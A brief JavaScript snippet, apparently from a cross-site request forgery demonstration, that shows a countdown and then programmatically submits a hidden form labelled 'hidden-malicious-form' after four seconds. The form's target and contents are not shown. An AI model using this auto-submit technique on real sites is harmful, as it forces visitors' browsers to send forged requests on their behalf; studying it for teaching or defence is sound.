const submitCounterUpdateInMillis = 1000;
let currentCounter = 3;
setInterval(() => {
  document.getElementById("counter").textContent = currentCounter--;
}, submitCounterUpdateInMillis);
const maliciousForm = document.getElementById("hidden-malicious-form");
maliciousForm.addEventListener("submit", (e) => {
  e.preventDefault();
  e.stopPropagation();
});
setTimeout(() => {
  maliciousForm.submit();
}, submitCounterUpdateInMillis * 4);
